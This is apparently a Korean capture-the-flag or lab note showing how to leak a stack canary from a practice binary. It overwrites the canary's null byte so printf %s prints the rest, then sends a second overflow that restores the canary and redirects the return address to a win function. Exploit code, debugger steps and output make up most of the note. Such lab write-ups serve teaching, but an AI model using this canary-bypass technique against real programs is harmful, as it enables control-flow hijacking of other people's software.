# 02 · 카나리 leak 디버깅

## 소스 요지
```c
void vuln() {
    char buf[0x40];
    read(0, buf, 0x49);          // buf~canary 직전까지 + 1바이트
    printf("hello %s\n", buf);   // %s로 출력 → 카나리 \x00 덮으면 샌다
    read(0, buf, 0x100);         // 2차: 크게 오버플로우
}
```
`checksec`: **Canary found**. 카나리를 모르면 BOF 시 `__stack_chk_fail`로 죽음.

## 1) 카나리 위치
```
$ objdump -d vuln
  401190: sub    $0x50,%rsp
  401194: mov    %fs:0x28,%rax    ; 카나리 로드
  ...
  4011b2: lea    -0x50(%rbp),%rax ; buf = rbp-0x50
  40120d: sub    %fs:0x28,%rax    ; 카나리 검사
```
`buf=rbp-0x50`, 카나리는 `rbp-8`에 저장됨.
```
rbp-0x50  [ buf (0x48) ]
rbp-0x08  [ canary  ]   ← 최하위 바이트 항상 \x00
rbp       [ saved rbp ]
rbp+8     [ ret ]
```
→ buf에서 카나리까지 `0x48`.

## 2) gdb로 카나리 확인
```
pwndbg> b *vuln+0x7d          # sub fs:0x28 직전(검사) 쯤
pwndbg> r
pwndbg> canary                # pwndbg: 현재 카나리 출력
AT_RANDOM = ...
Canary    = 0x....00          ← 끝이 00
pwndbg> x/gx $rbp-8           # 스택에 저장된 카나리
0x7fff...: 0x....00
```

## 3) leak 원리
`0x48`바이트를 채우면 다음 바이트가 **카나리의 `\x00`(LSB)**.
딱 1바이트 더 써서 그 `\x00`을 `'B'`로 바꾸면, `printf("%s")`가
`\x00`에서 멈추지 못하고 **카나리 상위 7바이트까지 이어서 출력**.
```python
p.send(b'A'*0x48 + b'B')             # LSB 덮기
p.recvuntil(b'A'*0x48)
leak = p.recvn(8)                    # 'B' + 카나리[1:8]
canary = u64(b'\x00' + leak[1:8])    # 덮은 LSB를 \x00로 복원
```
실측 결과: `canary = 0xe66417a414352700` → **끝이 00** (정상).

## 4) 2차 BOF (카나리 복원해서)
```python
# ret까지 = buf(0x48) + canary(8) + saved rbp(8) = 0x58
payload  = b'A'*0x48 + p64(canary) + b'B'*8 + p64(ret) + p64(win)
```
카나리 자리에 **leak한 값 그대로** 넣어야 검사를 통과.

## 5) 동작
```
$ make run
[+] canary = 0xe66417a414352700
PWNED
```

> 멀티스레드(pthread)면 카나리는 TLS에 있는 **master canary**로 모든 스레드 공유 →
> 스레드에서 한 번 leak하면 메인에서도 같은 값. `master_canary` 노트 참고.
